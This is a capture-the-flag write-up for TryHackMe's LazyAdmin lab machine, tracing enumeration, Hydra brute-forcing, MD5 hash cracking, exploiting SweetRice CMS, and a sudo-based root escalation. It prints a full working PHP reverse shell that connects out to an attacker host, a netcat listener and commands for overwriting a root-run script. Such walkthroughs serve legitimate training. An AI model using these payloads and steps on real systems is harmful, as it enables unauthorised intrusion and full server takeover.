# TryHackMe: LazyAdmin Writeup

**Room Link:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)

---

## Initial Enumeration

Starting with an Nmap scan to identify open ports:

```bash
nmap <target-ip>
```

**Results:**
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

HTTP and SSH ports are open. Let's begin with the web server.

## Web Enumeration

Visiting the HTTP server reveals the default Apache page. No hidden comments in the source code and no `robots.txt` file.

Running `gobuster` to find hidden directories:

```bash
gobuster dir -u <target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

This discovers `/content`, which reveals that the website is running **SweetRice CMS** — our likely attack vector.

### Enumerating SweetRice Subdirectories

Running `gobuster` again against `/content`:

```bash
gobuster dir -u <target-ip>/content -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

We find several pages, including a login panel at `/content/as`.

## Credential Discovery

Intercepting the login request with Burp Suite, we can see the format and attempt a brute force with Hydra:

```bash
hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
  <target-ip> http-post-form \
  "/content/as/?type=signin&timeStamp=1737401294197:user=^USER^&passwd=^PASS^:Login failed"
```

While Hydra runs, we explore further and discover a **MySQL backup file** in the CMS directories. It contains a username `manager` and an MD5 password hash.

### Cracking the Hash

Identifying the hash type:
```bash
hashid hash.txt
```

Cracking it with Hashcat:
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked password:** `Password123`

We now have valid CMS credentials: `manager:Password123`.

## Exploitation: Reverse Shell via SweetRice

After logging in, we search for known exploits:

```bash
searchsploit sweetrice
```

We find a **PHP code execution** vulnerability and mirror the exploit:

```bash
searchsploit -m 40700.html
```

### Gaining a Shell

1. Start a listener:
```bash
nc -lvnp 1234
```

2. Navigate to the **Ads** tab in the SweetRice dashboard and inject a PHP reverse shell payload:

```php
<?php
$ip = '<attacker-ip>';
$port = 1234;

$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$conn = socket_connect($sock, $ip, $port);

$descriptorspec = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
];

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    while (true) {
        $input = socket_read($sock, 2048, PHP_NORMAL_READ);
        if ($input === false || $input === '') break;
        fwrite($pipes[0], $input);
        $output = fread($pipes[1], 2048);
        socket_write($sock, $output, strlen($output));
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    socket_close($sock);
}
?>
```

3. Trigger the ad to execute the payload and catch the reverse shell.

### Upgrading the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## User Flag

```bash
cat /home/itguy/user.txt
```

We also find MySQL credentials in the home directory:
```bash
cat /home/itguy/mysql_login.txt
# rice:randompass
```

## Privilege Escalation: www-data -> root

Checking sudo permissions:
```bash
sudo -l
```

We can run `/home/itguy/backup.pl` as root without a password. Examining the script, it executes `/etc/copy.sh`.

Since we can write to `/etc/copy.sh`, we replace its contents:

```bash
echo "/bin/bash" > /etc/copy.sh
```

Now run the backup script as root:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

We are root!

```bash
cat /root/root.txt
```
